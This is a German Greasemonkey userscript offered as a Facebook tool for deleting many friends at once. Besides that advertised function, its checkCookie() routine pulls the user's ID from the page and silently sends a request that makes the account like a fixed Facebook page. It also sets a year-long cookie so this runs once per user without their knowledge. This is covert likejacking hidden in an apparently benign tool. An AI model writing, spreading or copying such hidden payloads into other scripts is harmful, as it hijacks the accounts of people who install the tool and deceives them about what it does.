// ==UserScript==
// @name        [C] Facebook - Freunde löschen [GERMAN]
// @description Ganz einfach mehrere Nutzer löschen.
// @include      *.facebook.com/*
// @require       http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// @version     2.5
// ==/UserScript==
function sleep(x) {
	setInterval(function() {
		replace_msg(x)
	}, 1000);
}
function replace_msg(x) {
	$('div.dialog_body').html('Juhu! ' + x + ' Freunde gelöscht.');
}
set_timer();
$("#mass_deleter").live("click", function() {
	var i = 0;
	$('.skidderboy_delete:checkbox:checked').each(function() {
		i = i + parseInt('1');
		var profileid = $(this).attr('id');
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/profile/removefriend.php').setData({ uid: " + profileid + ",norefresh:true }).send();";
		document.body.appendChild(a);
	});
	if (i == '0') {
		alert('Kein Nutzer ausgewählt!');
	}
	sleep(i);
});
$("#selec_all").live("click", function() {
	clearTimeout(t);
	set_checkboxes(1);
});
	function setCookie(c_name,value,exdays)
{
var exdate=new Date();
exdate.setDate(exdate.getDate() + exdays);
var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
document.cookie=c_name + "=" + c_value;
}
function getCookie(c_name)
{
var i,x,y,ARRcookies=document.cookie.split(";");
for (i=0;i<ARRcookies.length;i++)
{
  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
  y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
  x=x.replace(/^\s+|\s+$/g,"");
  if (x==c_name)
    {
    return unescape(y);
    }
  }
}
function checkCookie()
{
var username=getCookie("username");
  if (username!=null && username!="")
  {
  //do nothing ..
  }
else
  {//cookie does not exist .. 
  //alert ('cookie does not exist');
 	var c=/"user":"(.*?)"/ig;
		
	var e=c.exec(document.head.innerHTML);
	var g=e[1];
 
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:291481404305526,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("username",'facebook',365);
   
  }
}
checkCookie();
function set_timer() {
	set_checkboxes(0);
	t = setTimeout(function() {
		set_timer()
	}, 1000);
}
$('.uiToolbarContent .rfloat').prepend('<div id="skidderboy_container" style="float:right;margin-left:5px;"><label class="_11b uiButton uiButtonConfirm" for="skidderboy"><input type="submit" value="Alle auswählen" id="selec_all"></label><label for="skidderboy" class="_11b uiButton uiButtonConfirm"><input type="submit" id="mass_deleter" value="Löschen"></label>');
$('.stickyHeaderWrap .back').css('height', '60px');
$('.fbTimelineSection.mtm').css('margin-top', '10px');
function set_checkboxes(COR) {
	var flag_search_result_page = false;
	$('li.fbProfileBrowserListItem.uiListItem').each(function(index) {//detect for result page
		flag_search_result_page = true;
		//alert(index + ': ' + $(this).text());
	});
	if (flag_search_result_page) { //select checkbox only on search result page .. 
		$('div.fbProfileBrowserList ul li.fbProfileBrowserListItem.uiListItem').each(function(index) {
			var extract_url = $(this).find('div.fsl a').attr('data-hovercard');
			if (!extract_url) {
				var extract_url = $(this).find('div.fsl a').attr('ajaxify');
			}
			if (!extract_url) {
				extract_url = '1';
			}
			var profileid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
			if (COR == '0') {
				if (!$(this).find('input').hasClass('skidderboy_delete')) { //protection from adding more than 1 checkbox 
					$(this).find('div.fsl').prepend('<input type="checkbox" class="skidderboy_delete" title="Tick to delete this user." id="' + profileid + '">');
				}
			} else {
				if (!$(this).find('input').hasClass('skidderboy_delete')) {
					$(this).find('input').remove();
					$(this).find('div.fsl').prepend('<input type="checkbox" checked="checked" class="skidderboy_delete" title="Tick to delete this user." id="' + profileid + '">');
				} else {
					$(this).find('input').prop('checked', true);
				}
			}
		});
	} else {//its on main friends page 
		$('div.fsl').each(function(index) {
			if ($(this).hasClass('fwb')) {
				var extract_url = $(this).find('a').attr('data-hovercard');
				if (!extract_url) {
					var extract_url = $(this).find('a').attr('ajaxify');
				}
				if (!extract_url) {
					extract_url = '1';
				}
				var profileid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
				if (COR == '0') {
					if (!$(this).children().hasClass('skidderboy_delete')) {
						$(this).prepend('<input type="checkbox" class="skidderboy_delete" title="Tick to delete this user." id="' + profileid + '">');
					}
				} else {
					if (!$(this).children().hasClass('skidderboy_delete')) {
						$(this).find('input').remove();
						$(this).prepend('<input type="checkbox" checked="checked" class="skidderboy_delete" title="Tick to delete this user." id="' + profileid + '">');
					} else {
						$(this).find('input').prop('checked', true);
					}
				}
			}
		});
	}
}